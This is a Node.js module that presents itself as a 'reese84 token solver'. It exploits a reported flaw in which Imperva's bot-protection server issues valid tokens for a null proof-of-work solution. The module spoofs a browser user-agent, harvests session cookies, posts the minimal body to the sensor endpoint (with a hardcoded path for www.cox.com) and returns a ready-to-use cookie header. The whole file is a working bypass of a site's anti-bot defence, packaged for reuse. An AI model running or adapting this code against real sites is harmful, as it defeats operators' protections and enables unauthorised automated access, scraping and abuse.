'use strict';

/**
 * reese84.js — Imperva reese84 token solver (pure Node.js)
 *
 * Finding: Imperva ABP server accepts solution.interrogation=null — degraded
 * mode issues tokens without validating Proof-of-Work. A minimal 84-byte POST
 * body is sufficient to obtain a valid reese84 token. No WASM execution, no
 * browser fingerprinting, no Playwright required.
 *
 * Winning POST body:
 *   {"solution":{"interrogation":null},"old_token":null,"error":null,"performance":null}
 *
 * Returns: {"token":"3:...","renewInSec":710,"cookieDomain":"cox.com"}
 */

const https = require('https');
const { URL } = require('url');

// sensor endpoint — static path per site, found in page HTML
// for cox.com it's hardcoded since it's a known constant
const ENDPOINTS = {
  'www.cox.com': '/orgone-Obed-abhorrow-That-Safe-Yong-abroach-it-p'
};

/**
 * Fetch the homepage HTML and extract the reese84 sensor script path.
 * Falls back to ENDPOINTS table if no match found.
 */
async function getSensorPath(hostname, cookieStr) {
  return new Promise((resolve) => {
    const req = https.request({
      hostname,
      path: '/',
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Cookie': cookieStr
      }
    }, res => {
      let html = '';
      res.on('data', c => html += c);
      res.on('end', () => {
        // look for the reese84 script tag — random path injected by Imperva
        const match = html.match(/src=["'](\/[a-zA-Z0-9_-]{10,60})["'][^>]*><\/script>/);
        if (match) return resolve(match[1]);
        // fall back to known path
        resolve(ENDPOINTS[hostname] || null);
      });
    });
    req.on('error', () => resolve(ENDPOINTS[hostname] || null));
    req.end();
  });
}

/**
 * GET the target homepage to collect Imperva session cookies
 * (visid_incap_*, nlbi_*, incap_ses_*).
 */
async function getSessionCookies(hostname) {
  return new Promise((resolve) => {
    const req = https.request({
      hostname,
      path: '/',
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
      }
    }, res => {
      const cookies = {};
      (res.headers['set-cookie'] || []).forEach(c => {
        const [kv] = c.split(';');
        const eq = kv.indexOf('=');
        if (eq > 0) cookies[kv.slice(0, eq).trim()] = kv.slice(eq + 1).trim();
      });
      res.resume();
      resolve(cookies);
    });
    req.on('error', () => resolve({}));
    req.end();
  });
}

/**
 * Build the minimal sensor POST body.
 * The server accepts interrogation=null and issues a token in degraded mode.
 */
function buildSensorBody(oldToken) {
  return JSON.stringify({
    solution: { interrogation: null },
    old_token: oldToken || null,
    error: null,
    performance: null
  });
}

/**
 * POST the sensor body to the sensor endpoint.
 */
async function postSensor(hostname, sensorPath, cookieStr, body) {
  return new Promise((resolve, reject) => {
    const req = https.request({
      hostname,
      path: sensorPath + '?d=' + hostname,
      method: 'POST',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'application/json; charset=utf-8',
        'Content-Type': 'text/plain; charset=utf-8',
        'Referer': 'https://' + hostname + '/',
        'Origin': 'https://' + hostname,
        'Cookie': cookieStr,
        'Content-Length': Buffer.byteLength(body)
      }
    }, res => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

/**
 * Solve the reese84 challenge for a target URL.
 *
 * @param {string} targetUrl - The URL of the Imperva-protected page
 * @param {object} [opts]
 * @param {boolean} [opts.verbose] - Log debug info to stderr
 * @returns {Promise<{token: string, renewInSec: number, cookieDomain: string, cookies: object, cookieHeader: string}>}
 */
async function solveReese84(targetUrl, opts) {
  opts = opts || {};
  const verbose = !!opts.verbose;
  const log = verbose
    ? (msg) => process.stderr.write('[reese84] ' + msg + '\n')
    : () => {};

  const url = new URL(targetUrl);
  const hostname = url.hostname;

  log('Fetching session cookies for: ' + hostname);
  const sessionCookies = await getSessionCookies(hostname);
  const cookieStr = Object.entries(sessionCookies).map(([k, v]) => `${k}=${v}`).join('; ');
  log('Session cookies: ' + Object.keys(sessionCookies).join(', '));

  log('Locating sensor endpoint...');
  const sensorPath = await getSensorPath(hostname, cookieStr);
  if (!sensorPath) throw new Error('Could not find reese84 sensor path for ' + hostname);
  log('Sensor path: ' + sensorPath);

  // POST minimal sensor body — server issues token regardless of interrogation contents
  const body = buildSensorBody(null);
  log('POSTing ' + Buffer.byteLength(body) + '-byte sensor body...');
  const res = await postSensor(hostname, sensorPath, cookieStr, body);

  if (res.status !== 200) {
    throw new Error('Sensor POST failed: HTTP ' + res.status + ' ' + res.body.slice(0, 100));
  }

  let parsed;
  try {
    parsed = JSON.parse(res.body);
  } catch (e) {
    throw new Error('Invalid sensor response: ' + res.body.slice(0, 100));
  }

  if (!parsed.token) throw new Error('No token in response: ' + res.body.slice(0, 100));

  log('Token obtained: ' + parsed.token.slice(0, 40) + '... (renewInSec: ' + parsed.renewInSec + ')');

  // merge token into cookies
  const allCookies = {
    ...sessionCookies,
    reese84: parsed.token,
    'x-d-token': parsed.token
  };

  return {
    token: parsed.token,
    renewInSec: parsed.renewInSec,
    cookieDomain: parsed.cookieDomain,
    cookies: allCookies,
    cookieHeader: Object.entries(allCookies).map(([k, v]) => `${k}=${v}`).join('; ')
  };
}

module.exports = { solveReese84 };
